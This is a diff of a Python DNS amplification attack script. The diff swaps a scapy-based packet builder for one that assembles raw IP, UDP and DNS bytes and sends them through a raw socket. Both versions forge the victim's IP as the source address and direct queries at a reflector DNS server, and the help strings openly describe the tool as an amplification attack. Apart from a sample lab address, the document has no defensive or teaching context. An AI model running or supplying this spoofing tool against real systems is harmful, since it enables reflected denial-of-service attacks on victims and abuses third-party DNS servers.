@@ -1,36 +1,61 @@
-#!/usr/bin/env python3
-
-from scapy.all import *
+import socket
 import argparse
 
-def create_dns_amplification_packet(reflector_ip, victim_ip):
-    # DNS Request to amplify
-    dns_query = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
-    
-    # UDP and IP layers
-    udp = UDP(sport=RandShort(), dport=53)
-    ip = IP(src=victim_ip, dst=reflector_ip)
+def craft_dns_query():
+    # DNS query: A record for example.com with ID 0xaabb
+    return (
+        b'\xaa\xbb'         # Transaction ID
+        b'\x01\x00'         # Standard Query with Recursion Desired
+        b'\x00\x01'         # QDCOUNT (1 question)
+        b'\x00\x00'         # ANCOUNT
+        b'\x00\x00'         # NSCOUNT
+        b'\x00\x00'         # ARCOUNT
+        b'\x07example'      # QNAME: "example"
+        b'\x03com'          # QNAME continued: "com"
+        b'\x00'             # Null byte to end QNAME
+        b'\x00\x01'         # QTYPE: A
+        b'\x00\x01'         # QCLASS: IN
+    )
 
-    # Combine and return full packet
-    packet = ip / udp / dns_query
-    return packet
+def send_spoofed_dns(reflector_ip, victim_ip, port=53):
+    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
-def main():
-    parser = argparse.ArgumentParser(description="Amplification attack using DNS")
-    parser.add_argument("reflector", help="IP address of the reflector (e.g., 192.168.56.2)")
-    parser.add_argument("--victim", help="Victim IP address (default: send response back to attacker)")
-    parser.add_argument("--service", default="dns", help="Service to use (dns, ntp, snmp)")
-    args = parser.parse_args()
+    # IP header fields
+    ip_header = b''
+    ip_header += b'\x45'            # Version + IHL
+    ip_header += b'\x00'            # TOS
+    ip_header += b'\x00\x3c'        # Total length (60 bytes)
+    ip_header += b'\xab\xcd'        # Identification
+    ip_header += b'\x00\x00'        # Flags/Fragment offset
+    ip_header += b'\x40'            # TTL
+    ip_header += b'\x11'            # Protocol: UDP
+    ip_header += b'\x00\x00'        # Header checksum (ignore, let OS fill in)
+    ip_header += socket.inet_aton(victim_ip)    # Spoofed source IP
+    ip_header += socket.inet_aton(reflector_ip) # Destination (DNS server)
 
-    if args.service != "dns":
-        print("Only DNS is implemented. SNMP and NTP not yet supported.")
-        return
+    # UDP header
+    udp_header = b''
+    udp_header += b'\x04\xd2'       # Source port (1234)
+    udp_header += bytes([port >> 8, port & 0xff])  # Destination port (53)
+    dns_query = craft_dns_query()
+    udp_length = 8 + len(dns_query)
+    udp_header += bytes([udp_length >> 8, udp_length & 0xff])  # Length
+    udp_header += b'\x00\x00'       # Checksum (set to 0)
 
-    victim_ip = args.victim if args.victim else get_if_addr(conf.iface)
-    pkt = create_dns_amplification_packet(args.reflector, victim_ip)
+    # Final packet
+    packet = ip_header + udp_header + dns_query
 
-    print(f"Sending spoofed DNS packet from {victim_ip} to {args.reflector}...")
-    send(pkt, verbose=1)
+    # Send spoofed packet
+    raw_socket.sendto(packet, (reflector_ip, port))
+    print(f"[+] Sent spoofed DNS packet from {victim_ip} to {reflector_ip}:{port}")
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="DNS Amplification using socket spoofing")
+    parser.add_argument("reflector_ip", help="IP of the DNS server to reflect from")
+    parser.add_argument("--victim_ip", help="Victim IP to spoof", default=None)
+
+    args = parser.parse_args()
+    victim_ip = args.victim_ip if args.victim_ip else socket.gethostbyname(socket.gethostname())
+
+    send_spoofed_dns(args.reflector_ip, victim_ip)
+
